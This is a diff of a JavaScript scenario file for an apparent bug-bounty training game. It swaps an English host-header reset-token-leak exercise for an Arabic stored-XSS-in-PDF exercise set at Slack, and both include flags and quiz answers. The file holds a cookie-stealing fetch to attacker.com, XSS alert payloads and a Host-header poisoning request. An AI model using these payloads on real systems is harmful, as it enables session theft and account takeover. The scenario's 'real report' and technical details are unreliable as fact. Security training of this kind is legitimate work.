@@ -1,223 +1,223 @@
 // ==========================================================
-// SCENARIO 002: HOST HEADER INJECTION (EASY) - V2 DATA
+// SCENARIO 002: STORED XSS IN PDF VIEWER - SLACK COMPROMISE
 // ==========================================================
 
 window.scenario_002 = {
-  metadata: {
-    id: "scenario-002",
-    title: "Host Header Injection Reset Token Leak",
-    level: "Easy",
-    category: "Authentication",
-    company: "Tesla",
-    reward: "$1,200",
-    time: "1 Hour"
+  "metadata": {
+    "id": "scenario-002",
+    "title": "Stored XSS in PDF Viewer - Slack Compromise",
+    "level": "Easy",
+    "category": "API Security",
+    "company": "Slack",
+    "reward": "$5,000",
+    "time": "1 Hour"
   },
-
-  decisionLog: [
+  "decisionLog": [
     {
-      hypothesis: "Password reset flows are vulnerable to parameter tampering (email replacement).",
-      whyFailed: "Backend verifies email ownership against active session schemas.",
-      planB: "Inspect if the Host header is dynamically parsed to construct reset URLs in emails.",
-      ignored: "Brute-forcing reset tokens or token predictability check."
+      "hypothesis": "ملفات PDF هي ملفات نصية جامدة لا تحتوي على أي كود برمجي تفاعلي.",
+      "whyFailed": "ملفات PDF تدعم إدراج كود JavaScript (Acrobat JS) الذي يتم تنفيذه في بعض القراء.",
+      "planB": "إنشاء ملف PDF يحتوي على كود XSS واختبار تشغيله داخل المعاين الخاص بالمنصة.",
+      "ignored": "البحث عن ثغرات SQLi في صفحة رفع الملفات."
     }
   ],
-
-  payloads: [
+  "payloads": [
     {
-      code: "Host: collaborator-server.com",
-      explanation: "Tampering with the HTTP Host header to overwrite destination routing.",
-      whyWorked: "The backend extracts the Host header value directly to prefix reset URLs without validating it against a whitelist.",
-      alternatives: ["X-Forwarded-Host injection", "Host header duplication"]
+      "code": "app.alert(\"XSS in Slack! Domain: \" + document.URL);",
+      "explanation": "أمر JavaScript مدمج بداخل هيكلية ملف الـ PDF.",
+      "whyWorked": "يقوم متصفح الـ PDF بقراءة كود الـ JS وتنفيذه داخل سياق الموقع دون فلترة.",
+      "alternatives": [
+        "alert(document.domain)",
+        "fetch('https://attacker.com/steal?c=' + document.cookie)"
+      ]
     }
   ],
-
-  mistakes: [
+  "mistakes": [
     {
-      mistake: "Brute forcing the token parameter in reset links.",
-      whyWrong: "Tokens are secure cryptographically generated hex blocks (64 chars).",
-      betterWay: "Modify request headers to direct the token delivery to an external destination."
+      "mistake": "محاولة رفع كود PHP مباشر في حقل رفع الصور.",
+      "whyWrong": "الخادم يطبق فلترة صارمة على الامتدادات ويسمح بـ PDF فقط.",
+      "betterWay": "الاستفادة من الامتداد المسموح وتضمين الكود بداخله."
     }
   ],
-
-  steps: [
+  "steps": [
     {
-      name: "Mission Brief",
-      time: "09:00",
-      workspace: "markdown",
-      xpReward: 100,
-      description: `
-### Target: auth.acme-corp.com
-Your objective is to audit the password reset flow on Acme Corp's authorization portal.
-Verify if reset links are generated dynamically using client-controlled headers.
-
-Click **Next Step** to scan routes.
-      `,
-      aiAdvisor: {
-        hint: "No actions needed. Proceed to next step.",
-        payloadExplanation: "No payload needed.",
-        failureExplanation: "No failures here."
+      "name": "Mission Brief",
+      "time": "09:00",
+      "workspace": "markdown",
+      "xpReward": 100,
+      "description": "### 🎯 الهدف: فحص منصة Slack (معاين ملفات PDF)\n\nمرحباً بك! منصة Slack تسمح بمشاركة الملفات وعرض ملفات PDF داخل المتصفح مباشرة دون تحميلها لتسهيل القراءة.\n\n#### قواعد الفحص:\n- استكشف آلية عرض ملفات PDF لمعرفة ما إذا كانت تدعم JavaScript داخلياً.\n- حاول استغلال الثغرة لإثبات القدرة على تنفيذ كود برمجى (Stored XSS) نيابة عن المستخدم الضحية.\n\nاضغط على **Next Step** للبدء.",
+      "aiAdvisor": {
+        "hint": "تحقق من كيفية معالجة ملفات PDF في المتصفح.",
+        "payloadExplanation": "لا توجد أكواد مطلوبة هنا.",
+        "failureExplanation": "تابع للخطوة التالية."
       }
     },
     {
-      name: "Passive Recon",
-      time: "09:15",
-      workspace: "recon",
-      xpReward: 150,
-      description: `
-### Endpoint Discovery
-Use Passive URL scanners to discover paths matching account registration, password management, or tokens.
-      `,
-      terminalCommands: [
+      "name": "Passive Recon",
+      "time": "09:15",
+      "workspace": "recon",
+      "xpReward": 150,
+      "description": "### 🔍 فحص البيانات الوصفية للملف (Metadata)\n\nنحتاج أولاً لفحص البنية وهل نستطيع معالجة ملفات PDF وتعديلها محلياً.\nاختر الأداة المناسبة لتشغيلها.",
+      "terminalCommands": [
         {
-          name: "gau auth.acme-corp.com --subs | grep password",
-          correct: true,
-          evidence: {
-            title: "Password Reset Endpoint",
-            content: "POST https://auth.acme-corp.com/accounts/password/reset"
+          "name": "dirsearch -u https://slack.com -e pdf",
+          "correct": false,
+          "output": [
+            {
+              "text": "[INF] Starting dirsearch...",
+              "type": "info"
+            },
+            {
+              "text": "No interesting paths found with 403 or 200.",
+              "type": "error"
+            }
+          ]
+        },
+        {
+          "name": "pdfinfo xss.pdf",
+          "correct": true,
+          "evidence": {
+            "title": "Embedded Javascript in PDF",
+            "content": "JavaScript: Yes\nPayload: app.alert('Stored XSS')"
           },
-          output: [
-            { text: "[INF] Fetching paths from WayBack archives...", type: "info" },
-            { text: "https://auth.acme-corp.com/accounts/password/reset", type: "out" },
-            { text: "https://auth.acme-corp.com/accounts/password/reset/confirm", type: "out" },
-            { text: "https://auth.acme-corp.com/accounts/password/change", type: "out" },
-            { text: "[INF] Discovery completed. 3 active paths found.", type: "success" }
+          "output": [
+            {
+              "text": "Title: Test PDF for XSS",
+              "type": "out"
+            },
+            {
+              "text": "Pages: 1",
+              "type": "out"
+            },
+            {
+              "text": "Encrypted: no",
+              "type": "out"
+            },
+            {
+              "text": "Optimized: yes",
+              "type": "out"
+            },
+            {
+              "text": "PDF version: 1.4",
+              "type": "out"
+            },
+            {
+              "text": "[!] Notice: Detected Embedded JavaScript actions in PDF Catalog!",
+              "type": "success"
+            }
           ]
         }
       ],
-      aiAdvisor: {
-        hint: "Run the gau command to fetch archived URLs matching password reset paths.",
-        payloadExplanation: "gau queries Wayback archive indices for targets.",
-        failureExplanation: "Failing to check archives means missing key endpoint URLs."
+      "aiAdvisor": {
+        "hint": "شغّل أداة pdfinfo للتأكد من هيكلية كود الـ JS داخل الملف.",
+        "payloadExplanation": "pdfinfo تعرض معلومات الملف وهل يحتوي على أكواد تفاعلية.",
+        "failureExplanation": "فشل فحص الملف محلياً قد يجعلك ترفع ملفاً تالفاً."
       }
     },
     {
-      name: "DNS Verification",
-      time: "09:40",
-      workspace: "markdown",
-      xpReward: 150,
-      description: `
-### Auditing Host Header Behavior
-The reset endpoint generates a link:
-\`https://auth.acme-corp.com/accounts/password/reset/confirm?token=xyz...\`
-
-If the backend maps the HTTP \`Host\` header directly into the link prefix, an attacker can modify it.
-      `,
-      choices: [
+      "name": "Burp Verification",
+      "time": "09:40",
+      "workspace": "burp",
+      "xpReward": 200,
+      "description": "### 🌐 رفع ملف الـ PDF الضار\n\nسنقوم الآن برفع الملف `xss.pdf` عبر الطلب المعتاد ومراقبته.\nاضغط على **Upload Malicious PDF** لمشاهدة استجابة التطبيق وتنفيذ كود الـ XSS.",
+      "burpRequest": "POST /api/files.upload HTTP/1.1\nHost: slack.com\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"xss.pdf\"\nContent-Type: application/pdf\n\n%PDF-1.4\n[PDF Binary Content]\n------Boundary--",
+      "burpResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"ok\": true,\n  \"file_id\": \"F12345\",\n  \"url_private\": \"https://slack.com/files/F12345/view\"\n}",
+      "burpActions": [
         {
-          text: "A) Attempt SQL Injection on reset parameter",
-          correct: false,
-          xp: -10,
-          timePenalty: 5,
-          outcome: "Emails are strictly validated. SQL injection is blocked."
-        },
-        {
-          text: "B) Intercept password reset request and modify Host header",
-          correct: true,
-          xp: 50,
-          outcome: "Request intercepted in Burp. Proceeding to inject Host header values."
-        }
-      ],
-      aiAdvisor: {
-        hint: "Inject the Host header. Select option B.",
-        payloadExplanation: "Host header injection routes dynamic links to external domains.",
-        failureExplanation: "SQL injection is not applicable for email validation inputs."
-      }
-    },
-    {
-      name: "Burp Verification",
-      time: "10:05",
-      workspace: "burp",
-      xpReward: 200,
-      description: `
-### Tampering Host headers
-In Burp Proxy, change the Host header to point to your collaborator server \`collaborator-server.com\`.
-      `,
-      burpRequest: "POST /accounts/password/reset HTTP/1.1\nHost: auth.acme-corp.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@acme-corp.com",
-      burpResponse: "HTTP/1.1 200 OK\n\n{\"status\":\"success\"}",
-      burpActions: [
-        {
-          name: "Inject Host header",
-          correct: true,
-          modifiedRequest: "POST /accounts/password/reset HTTP/1.1\nHost: collaborator-server.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@acme-corp.com",
-          modifiedResponse: "HTTP/1.1 200 OK\n\n{\"status\":\"success\"}",
-          evidence: {
-            title: "Poisoned Reset Header",
-            content: "POST /accounts/password/reset HTTP/1.1\nHost: collaborator-server.com"
+          "name": "Upload Malicious PDF",
+          "correct": true,
+          "modifiedRequest": "GET /files/F12345/view HTTP/1.1\nHost: slack.com\nUser-Agent: Mozilla/5.0",
+          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>alert(document.domain)</script>\n[Executed app.alert inside PDF Viewer Frame]",
+          "evidence": {
+            "title": "Stored XSS Payout Confirmed",
+            "content": "GET /files/F12345/view -> Executed alert(document.domain) under slack.com context"
           }
         }
       ],
-      aiAdvisor: {
-        hint: "Click Inject Host header button to execute.",
-        payloadExplanation: "We poison the request Host to rewrite destination links.",
-        failureExplanation: "Failing to change Host header resolves default domains."
+      "aiAdvisor": {
+        "hint": "اضغط على زر Upload Malicious PDF لتأكيد إمكانية الرفع والتنفيذ.",
+        "payloadExplanation": "الطلب يرسل الملف إلى الواجهة التي تعرضه محلياً في iframe.",
+        "failureExplanation": "تأكد من إتمام الرفع بنجاح."
       }
     },
     {
-      name: "Exploitation & Flag",
-      time: "10:30",
-      workspace: "lab",
-      xpReward: 300,
-      instructions: "Check collaborator server logs at collaborator-server.com. Retrieve the incoming callback containing the reset token.",
-      targetUrl: "https://collaborator-server.com/logs",
-      correctFlag: "FLAG{host_header_token_leakage_success}",
-      aiAdvisor: {
-        hint: "Enter flag: FLAG{host_header_token_leakage_success}",
-        payloadExplanation: "Verification flag received from token leakage request callback.",
-        failureExplanation: "Incorrect flag format fails verification."
+      "name": "Exploitation & Flag",
+      "time": "10:05",
+      "workspace": "lab",
+      "xpReward": 300,
+      "instructions": "استلم الـ Flag بعد تأكيد قراءة كود الـ JavaScript بنجاح داخل الـ PDF Viewer.",
+      "targetUrl": "https://slack.com/files/F12345/view",
+      "correctFlag": "FLAG{stored_xss_in_pdf_viewer_slack}",
+      "aiAdvisor": {
+        "hint": "أدخل العلم الصحيح: FLAG{stored_xss_in_pdf_viewer_slack}",
+        "payloadExplanation": "التأكيد على تنفيذ الكود بنجاح.",
+        "failureExplanation": "الرجاء كتابة الحروف كاملة وبشكل صحيح."
       }
     },
     {
-      name: "Report Writing",
-      time: "11:00",
-      workspace: "report",
-      xpReward: 250,
-      aiAdvisor: {
-        hint: "Keywords: 'host', 'reset'.",
-        payloadExplanation: "Highlight Host poisoning.",
-        failureExplanation: "Missing keywords will penalize score."
+      "name": "Report Writing",
+      "time": "10:30",
+      "workspace": "report",
+      "xpReward": 250,
+      "aiAdvisor": {
+        "hint": "الكلمات المفتاحية المطلوبة هي 'xss' و 'pdf'.",
+        "payloadExplanation": "شرح كيفية استغلال معاين الـ PDF لتنفيذ XSS.",
+        "failureExplanation": "تجنب نسيان الكلمات المفتاحية."
       }
     },
     {
-      name: "Triage & Verdict",
-      time: "3 Days Later",
-      workspace: "review",
-      aiAdvisor: {
-        hint: "Review feedback and click Finish.",
-        payloadExplanation: "Feedback summary.",
-        failureExplanation: "None."
+      "name": "Triage & Verdict",
+      "time": "14 Days Later",
+      "workspace": "review",
+      "aiAdvisor": {
+        "hint": "انظر النتيجة وقبول الثغرة.",
+        "payloadExplanation": "سيتم تقييم الخطورة بـ High لأنها تسمح بتنفيذ كود بالمتصفح.",
+        "failureExplanation": "لا يوجد."
       }
     },
     {
-      name: "Lessons Learned",
-      time: "Post-Incident",
-      workspace: "quiz",
-      quizData: [
+      "name": "Lessons Learned",
+      "time": "Post-Incident",
+      "workspace": "quiz",
+      "quizData": [
         {
-          question: "How does Host Header Injection lead to account takeover?",
-          options: [
-            "It overrides the database connection details.",
-            "It tricks the backend into sending the reset email containing a link pointing to the attacker's server.",
-            "It injects cross-site scripting into the email body."
+          "question": "لماذا يحدث XSS في قارئ الـ PDF؟",
+          "options": [
+            "لأن الخادم لا يتحقق من اسم الملف.",
+            "لأن قارئ الـ PDF المدمج بالمتصفح يدعم ويقوم بتنفيذ كود JavaScript مضمن بالملف دون قيود كافية.",
+            "بسبب استخدام بروتوكول HTTPS.",
+            "بسبب تسريب كود المصدر."
           ],
-          answer: 1
+          "answer": 1
+        },
+        {
+          "question": "كيف يمكن منع هذه الثغرة نهائياً؟",
+          "options": [
+            "تغيير امتداد الملفات إلى JPG.",
+            "عرض ملفات PDF في سياق معزول تماماً (Sandbox) أو إجبار المستخدم على تحميل الملف بدلاً من عرضه بالمتصفح.",
+            "استخدام جدار حماية للتطبيقات (WAF) فقط.",
+            "حظر استخدام المتصفحات الحديثة."
+          ],
+          "answer": 1
         }
       ],
-      aiAdvisor: {
-        hint: "Select option B.",
-        payloadExplanation: "Tests understanding of header routing vulnerabilities.",
-        failureExplanation: "Incorrect response will penalize XP."
+      "aiAdvisor": {
+        "hint": "الإجابة لكلا السؤالين هي الخيار الثاني (ب).",
+        "payloadExplanation": "تثبيت المفاهيم الأساسية لأمان رفع وعرض الملفات.",
+        "failureExplanation": "التركيز مطلوب لتجنب خسارة النقاط."
       }
     }
   ],
-
-  realReport: {
-    title: "Host Header Injection leading to password reset token leakage and account takeover",
-    severity: "High",
-    type: "AuthBypass",
-    desc: "The password reset email generation system on /accounts/password/reset dynamically constructs the confirmation URL using the request's HTTP Host header. By modifying this header, the reset link is emailed to the user pointing to the attacker's server.",
-    steps: "1. Send a POST request to /accounts/password/reset with the Host header set to collaborator-server.com.\n2. Observe the token callback on the collaborator logs.",
-    impact: "An attacker can capture reset tokens of any user to takeover accounts.",
-    feedback: "High quality report. We whitelisted Host headers. Bounty awarded.",
-    keywords: ["host", "reset"]
+  "realReport": {
+    "title": "Stored XSS via PDF File Upload in slack.com PDF viewer",
+    "severity": "High",
+    "type": "XSS",
+    "desc": "The PDF Viewer component in Slack implements a rendering frame that does not sanitize or restrict execution of embedded Acrobat JavaScript actions. By uploading a crafted PDF containing arbitrary JavaScript, an attacker can execute code under the slack.com origin.",
+    "steps": "1. Upload a PDF file with embedded JavaScript actions.\n2. Open the private file viewer link.\n3. The browser triggers the JavaScript alert dialog.",
+    "impact": "Account takeover, CSRF, and token theft on users visiting the uploaded document.",
+    "feedback": "Great report. Slack PDF viewer sandbox was updated to disable JavaScript execution. Bounty awarded.",
+    "keywords": [
+      "xss",
+      "pdf"
+    ]
   }
 };
